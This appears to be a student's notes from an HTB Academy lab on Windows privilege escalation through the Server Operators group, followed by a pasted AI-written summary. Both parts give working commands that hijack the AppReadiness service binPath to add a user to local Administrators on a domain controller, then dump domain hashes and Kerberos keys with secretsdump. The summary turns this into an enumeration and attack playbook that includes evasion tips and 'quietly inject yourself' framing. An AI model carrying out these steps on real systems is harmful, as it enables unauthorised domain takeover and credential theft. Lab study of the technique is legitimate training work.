The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

Querying the AppReadiness Service
Let's examine the AppReadiness service. We can confirm that this service starts as SYSTEM using the sc.exe utility.

  Server Operators
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
Checking Service Permissions with PsService
We can use the service viewer/controller PsService, which is part of the Sysinternals suite, to check permissions on the service. PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

  Server Operators
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.

Checking Local Admin Group Membership
Let's take a look at the current members of the local administrators group and confirm that our target account is not present.

  Server Operators
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
Modifying the Service Binary Path
Let's change the binary path to execute a command which adds our current user to the default local administrators group.

  Server Operators
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
Starting the Service
Starting the service fails, which is expected.

  Server Operators
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
Confirming Local Admin Group Membership
If we check the membership of the administrators group, we see that the command was executed successfully.

  Server Operators
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
Confirming Local Admin Access on Domain Controller
From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

  Server Operators
MJBUCKNER@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
Retrieving NTLM Password Hashes from the Domain Controller
  Server Operators
MJBUCKNER@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...

GPT Sumamry 
🧠 Summary — Server Operators = Service Abuse → Local Admin → DC Looting
Server Operators group is heavily privileged, especially on DCs

They can:

Log in locally

Start/stop/configure services (🔥)

Use SeBackupPrivilege and SeRestorePrivilege

You don’t need to be a Domain Admin — you just need to modify the right service (like AppReadiness) to run your command as SYSTEM

🔁 Got This, Do That Workflow
🔍 Step 1: Check Group Membership
cmd
Copy
Edit
net localgroup "Server Operators"
✅ If you're listed → you’re in a strong position

⚙️ Step 2: Identify a SYSTEM-Level Service You Can Control
Use:

cmd
Copy
Edit
sc qc AppReadiness
or

cmd
Copy
Edit
PsService.exe security AppReadiness
✅ Look for SERVICE_ALL_ACCESS and SERVICE_START_NAME : LocalSystem

💣 Step 3: Abuse the Service
Modify the service binary:

cmd
Copy
Edit
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <your_user> /add"
Start the service:

cmd
Copy
Edit
sc start AppReadiness
💡 It’ll fail to run, but that’s okay — the command still executes.

🧑‍💻 Step 4: Confirm Local Admin Access
cmd
Copy
Edit
net localgroup Administrators
Now you're local admin on a DC, which gives you:

Full registry access

Ability to dump NTDS secrets

Install tools like Mimikatz

Pull secrets with:

bash
Copy
Edit
secretsdump.py -just-dc-user administrator
🔀 If This, Then That Decision Tree
Condition	Action
Member of Server Operators	Look for services you can control
Service runs as SYSTEM and is DEMAND_START	Change binPath → execute your command
Can’t start service	Try another service or reboot if allowed
Need full DA	Use dumped NTLM hash or AES key to pivot further
🧬 Patterns You Should Recognize
binPath hijack is a classic escalation move

SERVICE_ALL_ACCESS = full control, even if you're not DA

Local admin on a Domain Controller is as good as DA if you know where to look

💡 Hints / Tips
Many orgs underestimate Server Operators group

Services like AppReadiness, Fax, Spooler often run as SYSTEM and are underused

If command is too obvious or blocked, encode with PowerShell or drop a custom binary

You can also add any other user to a group from here, not just yourself

✅ Cleanup Reminder
If asked for proof without causing too much damage, you can:

Remove your user from local admin group:

cmd
Copy
Edit
net localgroup Administrators <user> /delete
Restore original service binPath:

cmd
Copy
Edit
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
Or explain clearly in report: binPath was temporarily modified to demonstrate exploitation; reverted after.

🧠 TL;DR:
Server Operators = full service control + SYSTEM runner.
Use it to quietly inject yourself into Local Admins on a DC — and from there, secretsdump.py the world.


✅ If You’re Going in Blind (No Idea Which Services Are Abusable):
🧰 Step 1: Enumerate All Services
Run this first to get a full list of all services (names & descriptions):

cmd
Copy
Edit
sc query state= all
or the cleaner version:

cmd
Copy
Edit
wmic service get Name,DisplayName,StartMode,State,Status
This gives you:

The service name (used with sc)

StartMode (look for Manual)

Whether it's currently Running or Stopped

🕵️‍♂️ Step 2: Use accesschk to Find Services You Can Control
cmd
Copy
Edit
accesschk.exe -uwcqv "BUILTIN\Server Operators" * /accepteula
🔍 What this does:

-u → user/group (can be your current user too)

-w → check write access

-c → check service configuration

-q → quiet (less noise)

-v → verbose (show the access rights)

This tells you:

What services Server Operators can change the binPath for

Which ones you can start or stop

You’ll get output like:

css
Copy
Edit
[+] SERVICE_NAME
      RW SERVICE_CHANGE_CONFIG
      RW SERVICE_START
      RW SERVICE_STOP
That’s your golden ticket right there 🎟️

💣 Step 3: Target the Most Boring SYSTEM Service
Once you spot one that:

✅ Runs as LocalSystem
✅ Is startable
✅ You can change config

→ That’s your target for binPath hijack.

Use:

cmd
Copy
Edit
sc qc <service>
to confirm it runs as LocalSystem

Then:

cmd
Copy
Edit
sc config <service> binPath= "cmd /c net localgroup Administrators <your_user> /add"
sc start <service>
🧬 Your Blind Workflow – One-Liner Style
bash
Copy
Edit
# 1. See services
sc query state= all

# 2. Find what you can mess with
accesschk.exe -uwcqv "BUILTIN\Server Operators" * /accepteula

# 3. Confirm it runs as SYSTEM
sc qc <servicename>

# 4. Abuse it
sc config <servicename> binPath= "cmd /c net localgroup Administrators buck /add"
sc start <servicename>
🔥 BONUS: If You Wanna Be a Savage
Make it more efficient with PowerShell:

powershell
Copy
Edit
Get-WmiObject win32_service | Where-Object { $_.StartName -eq "LocalSystem" -and $_.StartMode -eq "Manual" } | Select Name, DisplayName
That gives you only SYSTEM services that are manually startable → perfect for binPath hijacks.




